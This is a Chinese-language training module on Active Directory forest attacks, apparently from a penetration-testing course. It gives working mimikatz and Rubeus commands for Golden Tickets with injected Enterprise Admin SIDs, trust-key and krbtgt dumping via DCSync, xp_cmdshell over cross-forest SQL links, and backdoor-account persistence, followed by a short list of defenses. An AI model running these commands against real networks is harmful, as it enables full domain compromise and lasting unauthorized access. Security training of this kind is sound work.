# Module 18: 域森林攻击

## 第一节：域森林攻击技术

### 什么是域森林？

域森林是 Active Directory 中多个域的集合，共享一个公共的架构、配置和全局目录。域森林中的域之间存在信任关系，这为攻击者提供了跨域攻击的机会。

---

## 一、域森林基础

### 1.1 域森林结构

```
域森林结构:
├── 森林根域 (Forest Root Domain)
│   ├── 子域 (Child Domain)
│   │   └── 孙域 (Grandchild Domain)
│   └── 子域
├── 树域 (Tree Domain)
│   └── 子域
└── 外部信任域 (External Trust)
```

### 1.2 信任类型

| 信任类型 | 方向 | 传递性 | 说明 |
|----------|------|--------|------|
| 父子信任 | 双向 | 传递 | 自动创建 |
| 树根信任 | 双向 | 传递 | 自动创建 |
| 快捷信任 | 双向 | 传递 | 手动创建 |
| 外部信任 | 单向/双向 | 非传递 | 手动创建 |
| 森林信任 | 单向/双向 | 传递 | 手动创建 |

### 1.3 关键概念

```
关键概念:
├── SID (Security Identifier)
│   └── 唯一标识安全主体
├── SID History
│   └── 迁移时保留旧 SID
├── SID Filtering
│   └── 过滤外部 SID
├── Enterprise Admins
│   └── 森林级管理员
└── Schema Admins
    └── 架构管理员
```

## 三、跨域攻击

### 3.1 SID History 攻击

```
SID History 攻击原理:
├── SID History 用于域迁移
├── 包含用户的旧 SID
├── 访问资源时会检查 SID History
├── 可以注入 Enterprise Admin SID
└── 绕过域边界
```

### 3.2 Golden Ticket 跨域

```powershell
# 获取域 SID
Get-DomainSID -Domain child.domain
# S-1-5-21-1234567890-1234567890-1234567890

# 获取父域 SID
Get-DomainSID -Domain parent.domain
# S-1-5-21-0987654321-0987654321-0987654321

# 创建带 SID History 的 Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:child.domain /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:HASH /sids:S-1-5-21-0987654321-0987654321-0987654321-519 /ptt

# -519 是 Enterprise Admins 的 RID
```

### 3.3 使用 Rubeus

```powershell
# 创建跨域票据
Rubeus.exe golden /user:Administrator /domain:child.domain /sid:CHILD_SID /krbtgt:HASH /sids:PARENT_SID-519 /ptt
```

## 四、信任票据攻击

### 4.1 获取信任密钥

```powershell
# 使用 Mimikatz 获取信任密钥
mimikatz# lsadump::trust /patch

# 或从 DCSync
mimikatz# lsadump::dcsync /domain:child.domain /user:parent$
```

### 4.2 创建信任票据

```powershell
# 使用信任密钥创建 TGT
mimikatz# kerberos::golden /user:Administrator /domain:child.domain /sid:CHILD_SID /rc4:TRUST_KEY /service:krbtgt /target:parent.domain /ticket:trust.kirbi

# 使用票据请求服务票据
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parent.domain /dc:dc.parent.domain /ptt
```

### 4.3 访问父域资源

```powershell
# 导入票据后访问父域
dir \\dc.parent.domain\C$

# 或使用 PsExec
psexec \\dc.parent.domain cmd.exe
```

## 五、森林信任攻击

### 5.1 森林信任特点

```
森林信任:
├── 连接两个独立的森林
├── 可以是单向或双向
├── 默认启用 SID Filtering
├── 需要特殊技术绕过
└── 攻击面较小
```

### 5.2 SID Filtering 绕过

```
SID Filtering 绕过方法:
├── 利用 SID History (如果未过滤)
├── 利用外部域中的高权限用户
├── 利用共享资源的权限配置
└── 利用 Kerberos 委派
```

### 5.3 枚举可利用的权限

```powershell
# 查找外部域中的权限
Get-DomainObjectAcl -Domain external.forest -ResolveGUIDs | ? { $_.SecurityIdentifier -match "S-1-5-21-LOCAL" }

# 查找外部域中的组成员
Get-DomainForeignGroupMember -Domain external.forest
```

## 七、跨森林SQL Server链接攻击

### 7.1 SQL Server链接跨森林

```
跨森林SQL链接攻击:
├── 森林间可能存在SQL Server链接
├── 链接可能配置了高权限账户
├── 可以绕过SID Filtering
└── 直接在目标森林执行命令
```

### 7.2 枚举跨森林SQL链接

```powershell
# 使用PowerUpSQL枚举
Import-Module .\PowerUpSQL.ps1

# 发现SQL Server实例
Get-SQLInstanceDomain

# 检查链接服务器
Get-SQLServerLink -Instance "sql01.corp.com"

# 爬取链接服务器链
Get-SQLServerLinkCrawl -Instance "sql01.corp.com"
```

### 7.3 利用跨森林SQL链接

```sql
-- 检查链接服务器
EXEC sp_linkedservers;

-- 在外部森林的SQL Server上执行查询
SELECT * FROM OPENQUERY("EXTERNAL_SQL", 'SELECT @@servername');

-- 检查权限
SELECT * FROM OPENQUERY("EXTERNAL_SQL", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- 如果有sysadmin权限，执行命令
EXEC ('xp_cmdshell ''whoami''') AT EXTERNAL_SQL;
```

### 7.4 完整跨森林SQL攻击

```csharp
// C#代码示例
String sqlServer = "sql01.corp.com";
String conString = "Server = " + sqlServer + "; Database = master; Integrated Security = True;";
SqlConnection con = new SqlConnection(conString);
con.Open();

// 枚举链接服务器
String query = "EXEC sp_linkedservers;";
SqlCommand cmd = new SqlCommand(query, con);
SqlDataReader reader = cmd.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine("Linked server: " + reader[0]);
}
reader.Close();

// 在外部森林执行命令
String execQuery = "EXEC ('xp_cmdshell ''whoami''') AT EXTERNAL_SQL;";
cmd = new SqlCommand(execQuery, con);
reader = cmd.ExecuteReader();
while (reader.Read())
{
    Console.WriteLine(reader[0]);
}
reader.Close();
```

## 八、实践示例

### 7.1 跨域攻击流程

```
1. 枚举信任关系
   - 识别所有信任
   - 确定信任类型和方向

2. 获取当前域控制
   - 获取 krbtgt 哈希
   - 获取信任密钥

3. 创建跨域票据
   - Golden Ticket + SID History
   - 或信任票据

4. 访问目标域
   - 验证访问权限
   - 执行目标操作

5. 持久化
   - 在目标域建立访问
   - 创建后门账户
```

### 7.2 完整攻击示例

```powershell
# 1. 枚举信任
Get-DomainTrust

# 2. 获取 krbtgt 哈希
mimikatz# lsadump::dcsync /user:krbtgt

# 3. 获取域 SID
$childSID = Get-DomainSID
$parentSID = Get-DomainSID -Domain parent.domain

# 4. 创建 Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:child.domain /sid:$childSID /krbtgt:HASH /sids:$parentSID-519 /ptt

# 5. 访问父域
dir \\dc.parent.domain\C$
```

## 八、防御建议

### 8.1 安全配置

```
防御措施:
├── 启用 SID Filtering
├── 启用选择性认证
├── 限制信任关系
├── 监控跨域访问
├── 保护 krbtgt 账户
├── 定期轮换信任密钥
└── 使用 PAM (Privileged Access Management)
```

### 8.2 监控

```
监控建议:
├── 监控跨域认证
├── 监控 SID History 使用
├── 监控 Enterprise Admins 活动
├── 监控信任关系变更
└── 使用 ATA/ATP 检测
```
